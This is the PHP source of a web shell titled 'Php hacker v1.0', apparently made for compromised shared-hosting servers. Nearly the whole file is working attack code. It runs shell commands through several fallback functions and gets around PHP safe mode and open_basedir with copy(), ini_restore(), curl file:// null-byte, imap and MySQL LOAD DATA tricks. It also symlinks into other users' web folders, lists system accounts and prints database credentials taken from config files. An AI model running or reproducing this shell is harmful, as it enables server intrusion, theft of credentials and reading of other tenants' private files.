<?
/*########################################### 
Script Name : Php hacker v1.0
Written By Hussien Yousef					  
###########################################*/
################# To be edited by the user ########################
///////////////////////////////
                             //
$mysql_use = "no"; //"yes"   //
$mhost = "localhost";        //
$muser = "root";             //
$mpass = "pass";             //
$mdb = "name";               //
$them = "xxx"; //any site    //
$you = "xx"; //your username //
$flib = "hack.txt";        //
$folder = "hack.txt";      //
///////////////////////////////
############# DO NOT MODIFY FROM HERE ON ##################
error_reporting(0); 
set_magic_quotes_runtime(0);
if(version_compare(phpversion(), '4.1.0') == -1)
 {$_POST   = &$HTTP_POST_VARS;$_GET    = &$HTTP_GET_VARS;
 $_SERVER = &$HTTP_SERVER_VARS;
 }function inclink($link,$val){$requ=$_SERVER["REQUEST_URI"];
if (strstr ($requ,$link)){return preg_replace("/$link=[\\d\\w\\W\\D\\S]*/","$link=$val",$requ);}elseif (strstr ($requ,"showsc")){return preg_replace("/showsc=[\\d\\w\\W\\D\\S]*/","$link=$val",$requ);}
elseif (strstr ($requ,"hlp")){return preg_replace("/hlp=[\\d\\w\\W\\D\\S]*/","$link=$val",$requ);}elseif (strstr($requ,"?")){return $requ."&".$link."=".$val;}
else{return $requ."?".$link."=".$val;}}
function delm($delmtxt){print"<center><table bgcolor=black style='border:1px solid #008080' width=99% height=2%>";print"<tr><td><b><center><font size=2 color=#008080>$delmtxt</td></tr></table></center>";}
function callfuncs($cmnd){if (function_exists(shell_exec)){$scmd=shell_exec($cmnd);
$nscmd=htmlspecialchars($scmd);print $nscmd;}
elseif(!function_exists(shell_exec)){exec($cmnd,$ecmd);
$ecmd = join("\n",$ecmd);$necmd=htmlspecialchars($ecmd);print $necmd;}
elseif(!function_exists(exec)){$pcmd = popen($cmnd,"r");
while (!feof($pcmd)){ $res = htmlspecialchars(fgetc($pcmd));;
print $res;}pclose($pcmd);}elseif(!function_exists(popen)){ 
ob_start();system($cmnd);$sret = ob_get_contents();ob_clean();print htmlspecialchars($sret);}elseif(!function_exists(system)){
ob_start();passthru($cmnd);$pret = ob_get_contents();ob_clean();
print htmlspecialchars($pret);}}
function input($type,$name,$value,$size)
{if (empty($value)){print "<input type=$type name=$name size=$size>";}
elseif(empty($name)&&empty($size)){print "<input type=$type value=$value >";}
elseif(empty($size)){print "<input type=$type name=$name value=$value >";}
else {print "<input type=$type name=$name value=$value size=$size >";}}
function permcol($path){if (is_writable($path)){print "<font color=#008080>";
callperms($path); print "</font>";}
elseif (!is_readable($path)&&!is_writable($path)){print "<font color=red>";
callperms($path); print "</font>";}
else {print "<font color=white>";callperms($path);}}
if ($dlink=="dwld"){download($_REQUEST['dwld']);}
function download($dwfile) {$size = filesize($dwfile);
@header("Content-Type: application/force-download;name=$dwfile");
@header("Content-Transfer-Encoding: binary");
@header("Content-Length: $size");
@header("Content-Disposition: attachment; filename=$dwfile");
@header("Expires: 0");
@header("Cache-Control: no-cache, must-revalidate");
@header("Pragma: no-cache");
@readfile($dwfile); exit;}
?>
<html> 
<head><title>PHPHacker Shell</title></head>
<style> 
BODY { SCROLLBAR-BASE-COLOR: #191919; SCROLLBAR-ARROW-COLOR: #008080; } 
a{color:#dadada;text-decoration:none;font-family:tahoma;font-size:13px}
a:hover{color:#008080}
input{FONT-WEIGHT:normal;background-color: #191919;font-size: 12px; color: #dadada; font-family: Tahoma; border: 1px solid #666666;height:17}
textarea{background-color:#191919;color:#dadada;font-weight:bold;font-size: 12px;font-family: Tahoma; border: 1 solid #666666;}
div{font-size:12px;font-family:tahoma;font-weight:normal;color:whitesmoke}
select{background-color: #191919; font-size: 12px; color: #dadada; font-family: Tahoma; border: 1 solid #666666;font-weight:bold;}</style> 
<body bgcolor=black text=white><font face="sans ms" size=3> 
</body> 
</html> 
<?
$nscdir =(!isset($_REQUEST['scdir']))?getcwd():chdir($_REQUEST['scdir']);$nscdir=getcwd();
$sf="<form method=post>";$ef="</form>";
$st="<table style=\"border:1px #dadada solid \" width=100% height=100%>";
$et="</table>";$c1="<tr><td height=22% style=\"border:1px #dadada solid \">";
$c2="<tr><td style=\"border:1px #dadada solid \">";$ec="</tr></td>";
$sta="<textarea cols=157 rows=23>";$eta="</textarea>";
$sfnt="<font face=tahoma size=2 color=#008080>";$efnt="</font>";
################# PhP Design (Start) ########################
delm(": Php Hacker v1.0 (WebShell) :");
print"<table bgcolor=#191919 style=\"border:2px #dadada solid \" width=100% height=%>";print"<tr><td>"; print"<b><center><font face=tahoma color=white size=4>[ Php hacker v1.0 ]::[ :) ]
</font></b></center>"; print"</td></tr>";print"</table>";print "<br>";
print"<table bgcolor=#191919 style=\"border:2px #dadada solid \" width=100% height=%>";print"<tr><td>"; print"<center><div><b>";print "<a href=".inclink('linux', 'greet').">Gr33tz To</a>";
print " - <a href='javascript:history.back()'>Back</a>";
print "</td></tr></table>";
echo "<br>";
print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100%>"; 
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
	{
	 $safemode = true;
	 $hsafemode = "<font color=\"red\">ON (secure)</font>";
	}
	else {$safemode = false; $hsafemode = "<font color=\"green\">OFF (not secure)</font>";}
	echo("Safe-mode: $hsafemode");
print "</td></tr></table>";
echo "<br>";
################# PhP Hacked ########################
// read greet //
if ($linux=='greet')
{
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
echo "Alph4W0lf";
  echo "</textarea>";
}
// read file unzend sorce //
if(empty($_POST['sorce'])){
} else {

}
// read file unzend functions //
 if(empty($_POST['func'])){
} else {
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
$zeen=$_POST['func'];
require("$zeen");
echo "Database : ".$config['Database']['dbname']." <X> ";
echo "UserName : ".$config['MasterServer']['username']." <X> ";
echo "Password : ".$config['MasterServer']['password']." <X> ";
echo "</textarea></p>";
}// read file symlink ( ) //
if(empty($_POST['sym'])){
} else {
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
$fp = fopen("hack.txt","w+");
fwrite($fp,"Php Hacker Was Here");
@unlink($flib);
$sym = "/home/" . $them . "/public_html/" . $k;
$link = "/home/"  . $you . "/public_html/" . $folder . "/" . $flib;
@symlink($sym, $link);
if ($k{0} == "/") {
echo "<script> window.location = '" . $flib . "'</script>";
}else{
echo "<pre><xmp>";
echo readlink($flib) . "\n";
echo "Filesize: " . linkinfo($flib) . "B\n\n";
echo file_get_contents("http://" . $_SERVER['HTTP_HOST'] . "/"  . $folder . "/" . $flib);
  echo "</textarea>";
}
}

// read file plugin ( ) //
if(empty($_POST['plugin'])){
} else {
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
for($uid=0;$uid<60000;$uid++){   //cat /etc/passwd
 $ara = posix_getpwuid($uid);
  if (!empty($ara)) {
       while (list ($key, $val) = each($ara)){
        print "$val:";
  }
  print "\n";
     }
  }
  echo "</textarea>";
}
// read file id ( ) //
if ($_POST['rid'] ){
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
 for($uid=0;$uid<60000;$uid++){   //cat /etc/passwd
$ara = posix_getpwuid($uid);
 if (!empty($ara)) {
while (list ($key, $val) = each($ara)){
print "$val:";
}
 print "\n";
}
 }
echo "</textarea>";
break;

 }
// read file imap ( ) //
$string = !empty($_POST['rimap']) ? $_POST['rimap'] : 0;
if(empty($_POST['rimap'])){
} else {
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
$stream = imap_open($string, "", "");
$str = imap_body($stream, 1);
echo "</textarea>";
}
// read file Curl ( ) //
if(empty($_POST['curl'])){
} else {
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
$m=$_POST['curl'];
$ch =
curl_init("file:///".$m."\x00/../../../../../../../../../../../../".__FILE__);
curl_exec($ch);
var_dump(curl_exec($ch));
echo "</textarea>";
}

// read file SQL ( ) //
if(empty($_POST['ssql'])){
} else {
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
$file=$_POST['ssql'];


$mysql_files_str = "/etc/passwd:/proc/cpuinfo:/etc/resolv.conf:/etc/proftpd.conf";
$mysql_files = explode(':', $mysql_files_str);

$sql = array (
"USE $mdb",
'CREATE TEMPORARY TABLE ' . ($tbl = 'A'.time ()) . ' (a LONGBLOB)',
"LOAD DATA LOCAL INFILE '$file' INTO TABLE $tbl FIELDS "
. "TERMINATED BY       '__THIS_NEVER_HAPPENS__' "
. "ESCAPED BY          '' "
. "LINES TERMINATED BY '__THIS_NEVER_HAPPENS__'",

"SELECT a FROM $tbl LIMIT 1"
);
mysql_connect ($mhost, $muser, $mpass);

								foreach ($sql as $statement) {
								   $q = mysql_query ($statement);

								   if ($q == false) die (
								      "FAILED: " . $statement . "\n" .
								      "REASON: " . mysql_error () . "\n"
								   );

								   if (! $r = @mysql_fetch_array ($q, MYSQL_NUM)) continue;

								   echo htmlspecialchars($r[0]);
								   mysql_free_result ($q);
								}
echo "</textarea>";
}



// read file copy & ini ( ) //
if (isset ($_REQUEST['safefile'])){
$file=$_REQUEST['safefile'];$tymczas="";if(empty($file)){
if(empty($_GET['file'])){if(empty($_POST['file'])){
print "<center>[ Please choose a file first to read it using copy() ]</center>";
} else {$file=$_POST['file'];}} else {$file=$_GET['file'];}}
$temp=tempnam($tymczas, "cx");if(copy("compress.zlib://".$file, $temp)){
$zrodlo = fopen($temp, "r");$tekst = fread($zrodlo, filesize($temp));
fclose($zrodlo);echo "<center><pre>".$sta.htmlspecialchars($tekst).$eta."</pre></center>";unlink($temp);} else {
print "<FONT COLOR=\"RED\"><CENTER>Sorry, Can't read the selected file !!
</CENTER></FONT><br>";}}if (isset ($_REQUEST['inifile'])){
ini_restore("safe_mode");ini_restore("open_basedir");
print "<center><pre>".$sta;
if (include(htmlspecialchars($_REQUEST['inifile']))){}else {print "Sorry, can't read the selected file !!";}print $eta."</pre></center>";}
delm(": Safe mode bypass :");
print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100%>";
print "<tr><td width=50%><div align=left>";
print $st.$c1."<div><b><center>Using copy() function</div>";
print $ec.$c2.$sf."&nbsp;";
input("text","safefile",$nscdir,75);
input("hidden","scdir",$nscdir,0);print " ";
input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
print "</td><td height=20% width=50%><div align=right>";
print $st.$c1."<div><b><center>Using ini_restore() function</div>";
print $ec.$c2.$sf."&nbsp;";
input("text","inifile",$nscdir,75);
input("hidden","scdir",$nscdir,0);print " ";
input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
print "</td></tr></table>";
print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100%>";
print "<tr><td width=50%><div align=left>";
print $st.$c1."<div><b><center>Using sql() function</div>";
print $ec.$c2.$sf."&nbsp;";
input("text","ssql",$nscdir,75);
input("hidden","scdir",$nscdir,0);print " ";
input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
print "</td><td height=20% width=50%><div align=right>";
print $st.$c1."<div><b><center>Using Curl() function</div>";
print $ec.$c2.$sf."&nbsp;";
input("text","curl",$nscdir,75);
input("hidden","scdir",$nscdir,0);print " ";
input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
print "</td></tr></table>";
print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100%>";
print "<tr><td width=50%><div align=left>";
print $st.$c1."<div><b><center>Using imap() function</div>";
print $ec.$c2.$sf."&nbsp;";
input("text","rimap",$nscdir,75);
input("hidden","scdir",$nscdir,0);print " ";
input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
print "</td><td height=20% width=50%><div align=right>";
print $st.$c1."<div><b><center>Using id() function</div>";
print $ec.$c2.$sf."&nbsp;";
input("text","rid",$nscdir,75);
input("hidden","scdir",$nscdir,0);print " ";
input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
print "</td></tr></table>";
print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100%>";
print "<tr><td width=50%><div align=left>";
print $st.$c1."<div><b><center>Using plugin() function</div>";
print $ec.$c2.$sf."&nbsp;";
input("text","plugin",$nscdir,75);
input("hidden","scdir",$nscdir,0);print " ";
input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
print "</td><td height=20% width=50%><div align=right>";
print $st.$c1."<div><b><center>Using symlink() function</div>";
print $ec.$c2.$sf."&nbsp;";
input("text","sym",$nscdir,75);
input("hidden","scdir",$nscdir,0);print " ";
input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
print "</td></tr></table>";
delm(": Unzend Config :");
print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100%>";
print "<tr><td width=50%><div align=left>";
print $st.$c1."<div><b><center>Connect To Functions Of Config</div>";
print $ec.$c2.$sf."&nbsp;";
input("text","func",$nscdir,75);
input("hidden","scdir",$nscdir,0);print " ";
input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
print "</td></tr></table>";
?><?
print "<br><table bgcolor=#191919 style=\"border:2px #dadada solid \" width=100% height=%>"; 
print"<tr><td><font size=2 face=tahoma>"; 
print"<center>Coded By alph4w0lf <br>[ Team 00 ]"; 
print"</font></td></tr></table>";
?>
